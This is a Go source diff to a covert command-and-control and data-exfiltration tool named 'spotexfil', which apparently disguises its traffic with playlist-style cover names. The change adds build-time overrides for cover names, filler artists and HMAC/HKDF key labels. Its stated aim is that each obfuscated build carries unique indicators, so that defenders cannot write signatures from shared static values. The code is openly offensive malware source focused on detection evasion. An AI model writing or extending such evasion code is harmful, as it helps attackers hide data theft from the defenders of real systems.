@@ -6,6 +6,7 @@ import (
 	_ "embed"
 	"encoding/json"
 	"fmt"
+	"strings"
 )
 
 //go:embed protocol.json
@@ -69,8 +70,61 @@ type C2Spec struct {
 // Proto is the parsed protocol spec, available at init time.
 var Proto Protocol
 
+// Build-time IOC overrides, injectable via -ldflags -X (see the Makefile
+// 'obfuscated' target). Empty = use protocol.json defaults. These exist so
+// each obfuscated build can ship unique cover names and crypto labels —
+// static values shared across builds are signature material for defenders.
+var (
+	OverrideCoverNamesCSV    = "" // comma-separated cover playlist names
+	OverrideFillerArtistsCSV = "" // comma-separated filler artists
+	OverrideMetaKeyLabel     = "" // HMAC label for the chunk metadata key
+	OverrideHKDFLabel        = "" // HKDF info label for session keys
+	OverrideSessionStore     = "" // HMAC label for the session-store key
+)
+
 func init() {
 	if err := json.Unmarshal(protocolJSON, &Proto); err != nil {
 		panic(fmt.Sprintf("failed to parse protocol.json: %v", err))
 	}
+	applyOverrides()
+}
+
+// applyOverrides mutates Proto with any build-time injected values.
+// Called from init; also called directly by tests.
+func applyOverrides() {
+	if OverrideCoverNamesCSV != "" {
+		Proto.Transport.CoverNames = splitCSV(OverrideCoverNamesCSV)
+	}
+	if OverrideFillerArtistsCSV != "" {
+		Proto.Transport.FillerArtists = splitCSV(OverrideFillerArtistsCSV)
+	}
+	if OverrideMetaKeyLabel != "" {
+		Proto.C2.MetaKeyLabel = OverrideMetaKeyLabel
+	}
+}
+
+func splitCSV(s string) []string {
+	var out []string
+	for _, part := range strings.Split(s, ",") {
+		if part = strings.TrimSpace(part); part != "" {
+			out = append(out, part)
+		}
+	}
+	return out
+}
+
+// HKDFLabel returns the HKDF info label for session key derivation.
+func HKDFLabel() string {
+	if OverrideHKDFLabel != "" {
+		return OverrideHKDFLabel
+	}
+	return "spotexfil-session-v1"
+}
+
+// SessionStoreLabel returns the HMAC label for the operator's session-store key.
+func SessionStoreLabel() string {
+	if OverrideSessionStore != "" {
+		return OverrideSessionStore
+	}
+	return "spotexfil-session-store"
 }
